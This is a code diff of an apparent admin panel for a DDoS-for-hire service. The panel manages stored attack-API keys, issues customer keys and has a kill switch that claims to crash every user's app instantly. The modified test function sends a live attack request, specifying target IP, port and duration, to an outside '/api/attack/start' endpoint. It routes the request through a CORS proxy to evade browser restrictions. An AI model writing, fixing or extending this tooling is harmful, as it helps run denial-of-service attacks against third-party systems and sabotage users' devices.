@@ -24,8 +24,6 @@
         .copy-btn { background: #00e5ff; color: #000; padding: 8px; font-size: 12px; border-radius: 3px; margin-top: 10px; width: auto; border: none; display: inline-block;}
         .btn-group { display: flex; gap: 10px; margin-top: 5px; }
         .btn-group button { margin: 0; }
-        
-        /* Lock Switch Style */
         .lock-box { display: flex; justify-content: space-between; align-items: center; margin-top: 15px;}
         .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
         .switch input { opacity: 0; width: 0; height: 0; }
@@ -44,7 +42,6 @@
     </div>
 
     <div id="mainPanel" class="hidden">
-        <!-- DATABASE URL -->
         <div class="box">
             <h2>🌐 DATABASE URL</h2>
             <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
@@ -55,7 +52,6 @@
             </div>
         </div>
 
-        <!-- API KEYS -->
         <div class="box">
             <h2>🔑 API KEYS (10 SLOTS)</h2>
             <div id="apiSlots">
@@ -77,24 +73,19 @@
             </div>
         </div>
 
-        <!-- TEST API BOX -->
         <div class="box">
             <h2>⚡ TEST API ONLINE</h2>
-            <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;">
-                <!-- Buttons will appear here dynamically -->
-            </div>
+            <div id="apiTestButtons" style="margin-bottom: 10px; display: flex; flex-wrap: wrap; gap: 10px;"></div>
             <div id="apiTestResult" style="font-size: 14px; font-weight: bold; margin-top: 10px;"></div>
         </div>
 
-        <!-- CUSTOM NOTIFICATION BOX -->
         <div class="box">
             <h2>📢 CUSTOM NOTIFICATION MESSAGE</h2>
-            <input type="text" id="notifTitle" placeholder="Notification Title (e.g., App Locked By Owner)" value="App Locked By Owner">
-            <textarea id="notifMessage" placeholder="Notification Message (e.g., Lock Apply Within 10s...)" style="min-height: 80px;">Lock Apply Within 10s. Agar tum 10s baad open kroge toh open nahi hoga!</textarea>
+            <input type="text" id="notifTitle" placeholder="Notification Title" value="App Locked By Owner">
+            <textarea id="notifMessage" placeholder="Notification Message" style="min-height: 80px;">Lock Apply Within 10s. Agar tum 10s baad open kroge toh open nahi hoga!</textarea>
             <button onclick="saveNotif()" class="success">SAVE & UPDATE MESSAGE</button>
         </div>
 
-        <!-- APP LOCK SWITCH -->
         <div class="box">
             <h2>🛑 APP LOCK STATUS</h2>
             <div class="lock-box">
@@ -107,7 +98,6 @@
             <div style="font-size: 11px; color: #888; margin-top: 10px;">Turn ON to crash all users instantly.</div>
         </div>
 
-        <!-- GENERATE NEW KEY -->
         <div class="box">
             <h2>🔑 GENERATE NEW KEY</h2>
             <input type="text" id="keyName" placeholder="Key Name (e.g. VIP-USER)">
@@ -119,7 +109,6 @@
             </div>
         </div>
 
-        <!-- ALL KEYS & DETAILS -->
         <div class="box">
             <h2>📋 ALL KEYS & DETAILS</h2>
             <button onclick="fetchKeys()" class="info">REFRESH LIST</button>
@@ -144,7 +133,6 @@
             } else { alert("Wrong Password"); }
         }
 
-        // ================= DATABASE URL =================
         function saveDb() {
             const db = dbUrlInput.value;
             if (!db) return alert("Enter DB URL");
@@ -152,17 +140,11 @@
             fetch(`${db}settings/config.json`, { method: 'PATCH', body: JSON.stringify({ db_url: db }) });
             alert("DB URL Saved!");
         }
-
         function updateDb() { saveDb(); alert("DB URL Updated in Cloud!"); }
         function deleteDb() {
-            if(confirm("Delete Database URL?")) {
-                localStorage.removeItem('dbUrl');
-                dbUrlInput.value = "";
-                alert("DB URL Deleted Locally!");
-            }
+            if(confirm("Delete Database URL?")) { localStorage.removeItem('dbUrl'); dbUrlInput.value = ""; alert("DB URL Deleted Locally!"); }
         }
 
-        // ================= API KEYS =================
         async function saveApi() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
@@ -174,10 +156,7 @@
         }
         function updateApi() { saveApi(); alert("APIs Updated!"); }
         function deleteApi() {
-            if(confirm("Clear all API Keys?")) {
-                for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; }
-                saveApi();
-            }
+            if(confirm("Clear all API Keys?")) { for(let i=1; i<=10; i++) { document.getElementById(`apiKey${i}`).value = ""; } saveApi(); }
         }
 
         async function fetchApis() {
@@ -188,17 +167,14 @@
                 const data = await res.json();
                 const testBtnContainer = document.getElementById('apiTestButtons');
                 testBtnContainer.innerHTML = "";
-
                 if (data) {
                     for(let i=1; i<=10; i++) {
                         const keyVal = data[`api_key_${i}`] || "";
                         document.getElementById(`apiKey${i}`).value = keyVal;
-                        
                         if(keyVal.trim() !== "") {
                             const btn = document.createElement('button');
                             btn.innerText = `Test API Slot ${i}`;
-                            btn.className = "info";
-                            btn.style.width = "auto";
+                            btn.className = "info"; btn.style.width = "auto";
                             btn.onclick = () => testApi(keyVal, i);
                             testBtnContainer.appendChild(btn);
                         }
@@ -207,37 +183,34 @@
             } catch(e) {}
         }
 
-        // ================= TEST API =================
+        // --- NEW FIXED API TEST ---
         async function testApi(apiKey, slotNumber) {
             const resDiv = document.getElementById('apiTestResult');
             resDiv.innerHTML = `<span style="color:#00e5ff;">Testing Slot ${slotNumber}... Please wait.</span>`;
 
-            // Use a CORS proxy to bypass browser restrictions
             const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=1.1.1.1&port=80&time=10`;
-            const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`;
             
             try {
+                // Using AllOrigins CORS proxy to bypass browser restriction
+                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
                 const response = await fetch(proxyUrl);
-                const data = await response.json();
-                const text = data.contents; // The actual API response
+                const text = await response.text();
                 
-                if (text.includes('"status": "success"') || text.includes('"status":"success"')) {
+                if (text.includes('"status": "success"') || text.includes('"status":"success"') || text.includes('Attack dispatched')) {
                     resDiv.innerHTML = `<span class="green">✅ API TEST PASS (Slot ${slotNumber} is Online)</span><br><small>${text}</small>`;
                 } else {
                     resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Slot ${slotNumber} Error)</span><br><small>${text}</small>`;
                 }
             } catch (error) {
-                resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Network Error)</span>`;
+                resDiv.innerHTML = `<span class="red">❌ API TEST FAIL (Network Error / Invalid API)</span>`;
             }
         }
 
-        // ================= CUSTOM NOTIFICATION =================
         async function saveNotif() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
             const title = document.getElementById('notifTitle').value;
             const message = document.getElementById('notifMessage').value;
-            
             await fetch(`${db}settings/notification.json`, { method: 'PUT', body: JSON.stringify({ title: title, message: message }) });
             alert("Notification Message Saved!");
         }
@@ -255,7 +228,6 @@
             } catch(e) {}
         }
 
-        // ================= APP LOCK =================
         async function toggleKill() {
             const db = dbUrlInput.value;
             if (!db) return alert("Save DB URL first");
@@ -272,20 +244,14 @@
                 const status = await res.json();
                 const statusText = document.getElementById('lockStatusText');
                 const switchBtn = document.getElementById('lockSwitch');
-                
                 if (status === true) {
-                    statusText.innerText = "Status: LOCKED (App Crashed)";
-                    statusText.style.color = "#ff003c";
-                    switchBtn.checked = true;
+                    statusText.innerText = "Status: LOCKED (App Crashed)"; statusText.style.color = "#ff003c"; switchBtn.checked = true;
                 } else {
-                    statusText.innerText = "Status: UNLOCKED";
-                    statusText.style.color = "#00ff41";
-                    switchBtn.checked = false;
+                    statusText.innerText = "Status: UNLOCKED"; statusText.style.color = "#00ff41"; switchBtn.checked = false;
                 }
             } catch (e) {}
         }
 
-        // ================= GENERATE KEY =================
         function formatTime(timestamp) {
             if (!timestamp || timestamp === 0) return "N/A";
             const d = new Date(timestamp);
@@ -318,7 +284,6 @@
             navigator.clipboard.writeText(generatedKeyText).then(() => { alert("Key Details Copied!"); });
         }
 
-        // ================= FETCH KEYS =================
         async function fetchKeys() {
             const db = dbUrlInput.value;
             if (!db) return;
